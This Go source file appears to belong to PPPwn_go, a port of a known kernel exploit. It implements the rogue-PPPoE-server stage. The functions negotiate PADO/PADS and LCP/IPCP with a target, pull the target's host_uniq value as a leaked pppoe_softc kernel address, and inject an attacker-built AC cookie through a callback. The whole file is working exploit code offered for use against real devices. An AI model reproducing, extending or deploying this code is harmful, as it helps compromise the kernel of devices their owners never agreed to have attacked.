package exploit

import (
	"encoding/binary"
	"net"

	"github.com/google/gopacket/layers"

	"github.com/wetor/PPPwn_go/internal/errors"
	"github.com/wetor/PPPwn_go/internal/lcp"
	"github.com/wetor/PPPwn_go/internal/logger"
	"github.com/wetor/PPPwn_go/internal/packet"
	"github.com/wetor/PPPwn_go/internal/pppoe"
)

func (e *Exploit) lcpNegotiation() (err error) {
	logger.Infof("[*] Sending LCP configure request...")
	err = e.p.SendLCP(&packet.SendLCPParams{
		SrcMAC:       e.sourceMac,
		DstMAC:       e.targetMac,
		EthernetType: layers.EthernetTypePPPoESession,
		SessionID:    SESSION_ID,
		LCP: &lcp.Pkt{
			Proto: lcp.ProtoLCP,
			Code:  lcp.CodeConfigureRequest,
			ID:    LCP_ID,
		},
	})
	if err != nil {
		logger.Error(err)
		return errors.LCPNegotiationError
	}

	logger.Infof("[*] Waiting for LCP configure ACK...")
	_, _, _ = e.p.ReceiveLCP(e.ctx, lcp.ProtoLCP, lcp.CodeConfigureAck)

	logger.Infof("[*] Waiting for LCP configure request...")
	_, pkt, _ := e.p.ReceiveLCP(e.ctx, lcp.ProtoLCP, lcp.CodeConfigureRequest)

	logger.Infof("[*] Sending LCP configure ACK...")
	err = e.p.SendLCP(&packet.SendLCPParams{
		SrcMAC:       e.sourceMac,
		DstMAC:       e.targetMac,
		EthernetType: layers.EthernetTypePPPoESession,
		SessionID:    SESSION_ID,
		LCP: &lcp.Pkt{
			Proto: lcp.ProtoLCP,
			Code:  lcp.CodeConfigureAck,
			ID:    pkt.ID,
		},
	})
	if err != nil {
		logger.Error(err)
		return errors.LCPNegotiationError
	}
	return nil
}

func (e *Exploit) ipcpNegotiation() (err error) {
	logger.Infof("[*] Sending IPCP configure request...")
	err = e.p.SendLCP(&packet.SendLCPParams{
		SrcMAC:       e.sourceMac,
		DstMAC:       e.targetMac,
		EthernetType: layers.EthernetTypePPPoESession,
		SessionID:    SESSION_ID,
		LCP: &lcp.Pkt{
			Proto: lcp.ProtoIPCP,
			Code:  lcp.CodeConfigureRequest,
			ID:    IPCP_ID,
			Options: []lcp.Option{
				&lcp.IPv4AddrOption{
					AddrType: lcp.OpIPAddress,
					Addr:     net.ParseIP(SOURCE_IPV4),
				},
			},
		},
	})
	if err != nil {
		logger.Error(err)
		return errors.IPCPNegotiationError
	}

	logger.Infof("[*] Waiting for IPCP configure ACK...")
	_, _, _ = e.p.ReceiveLCP(e.ctx, lcp.ProtoIPCP, lcp.CodeConfigureAck)

	logger.Infof("[*] Waiting for IPCP configure request...")
	_, pkt, _ := e.p.ReceiveLCP(e.ctx, lcp.ProtoIPCP, lcp.CodeConfigureRequest)

	logger.Infof("[*] Sending IPCP configure NAK...")
	err = e.p.SendLCP(&packet.SendLCPParams{
		SrcMAC:       e.sourceMac,
		DstMAC:       e.targetMac,
		EthernetType: layers.EthernetTypePPPoESession,
		SessionID:    SESSION_ID,
		LCP: &lcp.Pkt{
			Proto: lcp.ProtoIPCP,
			Code:  lcp.CodeConfigureNak,
			ID:    pkt.ID,
			Options: []lcp.Option{
				&lcp.IPv4AddrOption{
					AddrType: lcp.OpIPAddress,
					Addr:     net.ParseIP(TARGET_IPV4),
				},
			},
		},
	})
	if err != nil {
		logger.Error(err)
		return errors.IPCPNegotiationError
	}

	logger.Infof("[*] Waiting for IPCP configure request...")
	_, pkt, _ = e.p.ReceiveLCP(e.ctx, lcp.ProtoIPCP, lcp.CodeConfigureRequest)

	logger.Infof("[*] Sending IPCP configure ACK...")
	err = e.p.SendLCP(&packet.SendLCPParams{
		SrcMAC:       e.sourceMac,
		DstMAC:       e.targetMac,
		EthernetType: layers.EthernetTypePPPoESession,
		SessionID:    SESSION_ID,
		LCP: &lcp.Pkt{
			Proto:   lcp.ProtoIPCP,
			Code:    lcp.CodeConfigureAck,
			ID:      pkt.ID,
			Options: pkt.Options,
		},
	})
	if err != nil {
		logger.Error(err)
		return errors.IPCPNegotiationError
	}
	return nil
}

func (e *Exploit) pppNegotiation(cb func() []byte, ignoreInitialReq bool) (err error) {
	if ignoreInitialReq {
		logger.Infof("[*] Waiting for PADI...")
		_, _, _ = e.p.ReceivePPPoE(e.ctx, layers.EthernetTypePPPoEDiscovery, layers.PPPoECodePADI, e.injectTargetMac)
	}

	logger.Infof("[*] Waiting for PADI...")
	eth, pkt, _ := e.p.ReceivePPPoE(e.ctx, layers.EthernetTypePPPoEDiscovery, layers.PPPoECodePADI, e.injectTargetMac)
	var host_uniq []byte
	for _, tag := range pkt.Tags {
		if tag.Type() == uint16(pppoe.TagTypeHostUniq) {
			host_uniq = tag.(*pppoe.TagByteSlice).Value
			break
		}
	}
	if host_uniq == nil {
		logger.Error("host_uniq is nil")
		return errors.PPPNegotiationError
	}

	e.pppoeSoftc = binary.LittleEndian.Uint64(host_uniq)
	logger.Infof("[+] pppoe_softc: %x", host_uniq)
	e.targetMac = eth.SrcMAC
	logger.Infof("[+] Target MAC: %v", e.targetMac)
	e.sourceMac, _ = net.ParseMAC(SOURCE_MAC)
	var acCookie []byte
	if cb != nil {
		acCookie = cb()
	}
	logger.Infof("[+] AC cookie length: %X", len(acCookie))
	logger.Infof("[*] Sending PADO...")
	err = e.p.SendPPPoE(&packet.SendPPPoEParams{
		SrcMAC:       e.sourceMac,
		DstMAC:       e.targetMac,
		EthernetType: layers.EthernetTypePPPoEDiscovery,
		PPPoE: &pppoe.Pkt{
			Code: layers.PPPoECodePADO,
			Tags: []pppoe.Tag{
				&pppoe.TagByteSlice{
					Value:   acCookie,
					TagType: pppoe.TagTypeACCookie,
				},
				&pppoe.TagByteSlice{
					Value:   host_uniq,
					TagType: pppoe.TagTypeHostUniq,
				},
			},
		},
	})
	if err != nil {
		logger.Error(err)
		return errors.PPPNegotiationError
	}

	logger.Infof("[*] Waiting for PADR...")
	_, _, _ = e.p.ReceivePPPoE(e.ctx, layers.EthernetTypePPPoEDiscovery, layers.PPPoECodePADR, e.injectTargetMac)

	logger.Infof("[*] Sending PADS...")
	err = e.p.SendPPPoE(&packet.SendPPPoEParams{
		SrcMAC:       e.sourceMac,
		DstMAC:       e.targetMac,
		EthernetType: layers.EthernetTypePPPoEDiscovery,
		PPPoE: &pppoe.Pkt{
			Code:      layers.PPPoECodePADS,
			SessionID: SESSION_ID,
			Tags: []pppoe.Tag{
				&pppoe.TagByteSlice{
					Value:   host_uniq,
					TagType: pppoe.TagTypeHostUniq,
				},
			},
		},
	})
	if err != nil {
		logger.Error(err)
		return errors.PPPNegotiationError
	}
	return nil
}
